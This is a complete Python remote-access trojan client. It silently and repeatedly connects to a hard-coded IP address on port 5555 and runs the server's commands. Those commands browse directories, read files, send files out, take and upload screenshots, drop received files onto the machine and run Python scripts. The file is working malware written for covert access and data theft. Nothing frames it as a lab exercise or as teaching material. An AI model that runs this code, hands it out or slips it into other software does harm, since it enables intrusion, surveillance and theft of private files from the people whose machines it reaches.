import os
import subprocess
import tqdm
import pyautogui
import socket
import time
import json
#To send the present working directory to the server
def pwd():
    send1(os.getcwd())
#To change the present working directory and send the output to the server
def cd(stri):
    try:
        data=' '.join(stri)
        if "\\" in data:
            os.chdir(data)
            send1("changed to "+os.getcwd())
        elif data == "..":
            data1=os.getcwd()
            for i in range(len(data1)):
                if data1[i] == "\\":
                    last=i
            os.chdir(data1[:last])
            send1("changed to "+os.getcwd())

        else:
            os.chdir(os.getcwd()+"\\"+data)
            send1("changed to "+os.getcwd())
    except FileNotFoundError:
        if "/" in data:
            send1("Use / insted of \\")
        else:
            send1("file not found")
# To list all the file and directory and send to server
def ls(path):
    path1=''.join(path)
    all1 = ""
    try:
        arr1 = os.listdir(path1)
        sender = ""
        for i in arr1:
            if os.path.isdir(i):
                sender = sender + i +" -d" +"\n"
            else :
                sender = sender + i + " -f"+"\n"
        send1(sender)
    except FileNotFoundError:
        if "/" in path1:
            send1("Use / insted of \\")
        else:
            send1("ls: file not found")
# To list the file contents requested by the server
def cat(path1):
    path12=''.join(path1)
    with open(path12) as rdf:
        content=rdf.read()
        send1(content)
# To execute any python file present in the system
def python1(d1):
    send12=0
    completed_process = subprocess.run([d1[0],d1[1]], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    if completed_process.returncode == 0:
        send1(completed_process.stdout)
    else:
        send1("\n ... Execution Failed ... \n")

#to send a file back to the server , which was requested
def sendf(imgpth):
    SEPARATOR = "<SEPARATOR>"
    filesize = os.path.getsize(imgpth)
    s.send(f"{imgpth}{SEPARATOR}{filesize}".encode())
    time.sleep(0.2)
    with open(imgpth, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(4096)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar

#To send output to server
def send1(datasend):
    jsdata = json.dumps(datasend)
    s.send(jsdata.encode())
#To receie commands from server
def recv():
    data1 =''
    while True:
        try:
            data1 = data1 + s.recv(1024).decode().rstrip()
            return json.loads(data1)
        except ValueError:
            continue
#To receive files from server
def recvf():
    SEPARATOR = "<SEPARATOR>"
    received = s.recv(4096).decode()
    filename, filesize = received.split(SEPARATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    with open(filename, "wb") as f:
        size1=0
        while size1 < filesize:
            bytes_read = s.recv(4096)
            if not bytes_read:
                # No data received; you can add a timeout here if needed
                break
            f.write(bytes_read)
            size1 += len(bytes_read)
   
#The menu of operations
def menu():
    while True:
        a = recv()
        time.sleep(0.2)
        b = a.split()
        match b[0]:
            case "cd":
                cd(b[1:])
            case "pwd":
                pwd()
            case "ls":
                if len(b) == 1:
                    ls(os.getcwd())
                else:
                    ls(b[1:])
                
            case "bye":
                send1("\n Bye .... \n")
                break
            case "scrst":   # files
                    myScreenshot = pyautogui.screenshot()
                    imgpth1 = "img.png"
                    myScreenshot.save(imgpth1)
                    sendf(imgpth1)
            case "copy":
                sendf(''.join(b[1:]))
            case "cat":
                if len(b)>=2:
                    cat(b[1:])
                else:
                    send1("Invalid cat command")
            case "python":
                python1(b)
            case "send":
                recvf()
            case "python3":
                python1(b)
            case _:
                send1("Not found this?...")
#Establish a connection code
def conect1():
    while True:
        time.sleep(10)
        try:
            s.connect(('68.183.89.11',5555))
            menu()
            s.close()
            break
        except:
            continue
# for an ipv4 tcp onnection           
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #(ipv4,tcp)
conect1()


